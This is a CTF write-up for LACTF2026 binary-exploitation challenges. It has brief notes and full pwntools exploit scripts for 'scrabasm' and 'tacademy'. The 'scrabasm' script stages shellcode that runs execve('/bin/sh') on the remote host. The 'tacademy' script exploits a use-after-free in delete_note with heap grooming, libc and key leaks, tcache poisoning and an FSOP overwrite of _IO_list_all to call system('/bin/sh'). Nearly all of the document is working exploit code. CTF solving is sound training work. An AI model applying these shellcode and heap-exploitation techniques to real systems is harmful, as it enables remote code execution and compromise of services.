# LACTF2026

## tic-tac-no
<primary-label ref="pwn"/>

use minus-index based oob

## scrabasm
<primary-label ref="pwn"/>

do read in syscall to chain shellcode

```py
[~/dc/ctf/la/scrabasm]$cat s.py 
#!/usr/bin/env python3
from pwn import *
from icecream import ic
import subprocess

context.arch = 'amd64'
context.log_level = 'info'

shellcode = asm("""
mov rsi, rax
xor eax, eax
xor edi, edi
cdq
mov dl, 0x60
syscall
jmp rsi
""")
print(shellcode.hex())
print(len(shellcode))

#io = process('./chall')
io = remote("chall.lac.tf", 31338)

result = subprocess.run(['./solve'], capture_output=True, text=True)
swaps = [int(x) for x in result.stdout.strip().split('\n')]

log.info(f"Swaps: {swaps}")

ic(io.recvuntil(b'>'))

for pos, count in enumerate(swaps):
    for _ in range(count):
        io.sendline(b'1')
        io.sendline(str(pos).encode())

#gdb.attach(io)
io.sendline(b'2')
a = asm("call $+0x10")
a = a.ljust(14, b"\x90")
a+= asm("jmp rsi")
a+= asm("nop")*0x8
a+= asm("""
        xor rsi,rsi
        push rsi
        mov rdi,0x68732f2f6e69622f
        push rdi
        push rsp
        pop rdi
        push 59
        pop rax
        cdq
        syscall

""")
io.send(a)
io.interactive()
```

## tacademy
<primary-label ref="pwn"/>

the bug was obviously uaf in `delete_note()`.

```c
0040153d    int64_t delete_note()

0040154e        int32_t rax_1 = get_note_index()
00401571        free(mem: *((sx.q(rax_1) << 3) + &notes))
0040158a        *((sx.q(rax_1) << 3) + &notes) = 0
004015a3        return puts(str: "Note deleted!")
```

there was 2 slot we can save the pointer.
also, the size was restricted to less than 0xf0.
thus, I did heap feng shui to setting up large heap space.
then I falsified the size of chunk to create unsorted bins (chunk with chunk_size>0x400 will be connected to unsorted bins directly).

```py
from pwn import *
from icecream import ic
import sys
import re
import inspect

e = ELF("chall_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc chall.lac.tf 31144"
if "nc" in nc:
    HOST = nc.split(" ")[1]
    PORT = int(nc.split(" ")[2])
if "http" in nc:
    from urllib.parse import urlparse
    HOST = urlparse(nc).hostname
    PORT = urlparse(nc).port

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

context.timeout = 100

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sln  = lambda b: io.sendline(str(b).encode())
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv(timeout=100)
rn  = lambda a : io.recv(a,timeout=100)
ru  = lambda b : io.recvuntil(b,timeout=100)
rl  = lambda : io.recvline(timeout=100)
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
fsp = lambda b : f"%{b}$p".encode()
shell = lambda : io.interactive()

def hl(v: int): print(f"{(m := re.search(r'hl\s*\(\s*(.+?)\s*\)', inspect.getframeinfo(inspect.currentframe().f_back).code_context[0].strip())) and m.group(1) or '?'}: {hex(v)}")

payload = b""
def pay(*args, **kwargs): global payload; payload = b"".join([a if type(a) == bytes else (a.encode() if type(a) == str else p64(a)) for a in args])


def create(idx,sz,content):
    sln(1)
    sln(idx)
    sln(sz)
    s(content)
    ic(r())

def delete(idx):
    sln(2)
    sln(idx)
    ic(r())

def read(idx):
    sln(3)
    sln(idx)

for i in range(0xf):
    if i == 8:
        create(0,0x8+0x10*i,b"A"*0x18+p64(0x71))
        create(1,0x8+0x10*i,b"A")
        delete(0)
        delete(1)
    else:
        create(0,0x8+0x10*i,b"A")
        create(1,0x8+0x10*i,b"A")
        delete(0)
        delete(1)

create(0,1,b"A"*0x20)
read(0)

ru(b"A"*0x20)
leak = pu64(rl().strip())
hl(leak)
delete(0)

create(0,1,b"A"*0x28)
read(0)
ru(b"A"*0x28)
key = pu64(rl().strip())
hl(key)

pay(
    b"A"*0x10,
    0,
    0x20,
    leak
)
delete(0)
create(0,1,payload)
create(1,8,b"B")


pay(
    b"A"*0x10,
    0,
    0x461,
)
delete(0)
create(0,1,payload)

delete(1)
delete(0)

create(0,1,b"A"*0x20)
read(0)

ru(b"A"*0x20)
arena = pu64(rl().strip())
hl(arena)
libc.address = arena - (0x7a490921ace0 - 0x00007a4909000000)
hl(libc.address)

delete(0)
pay(
    b"A"*0x10,
    0, 0x461,
    arena, arena,
    0, 0x31,
    leak,key,
    0,0,
    0,0x31,
    libc.sym["_IO_list_all"]^leak,
)
create(0,1,payload)

def fsop_IO_list_all(addr):
    fs  = b"/bin/sh".ljust(8, b'\0')
    fs += p64(1)
    fs += p64(libc.sym["system"])
    fs += b"\x00" * (0x88 - len(fs))
    fs += p64(addr+0x18)
    fs += b"\x00" * (0xa0 - len(fs))
    fs += p64(addr - 0x10)
    fs += b"\x00" * (0xc0 - len(fs))
    fs += p32(1)
    fs += b"\x00" * (0xd0 - len(fs))
    fs += p64(addr - 0x8)
    fs += p64(libc.sym["_IO_wfile_jumps"] + 0x48 - 0x18)

    return fs


delete(0)
create(0,0x20,b"A"*0x10)
create(1,0x20,p64((leak<<12)+0x1090))
delete(0)
create(0,0xe8,fsop_IO_list_all((leak<<12)+0x1090))

sln(4)

sl(b"cat flag*")

shell()
```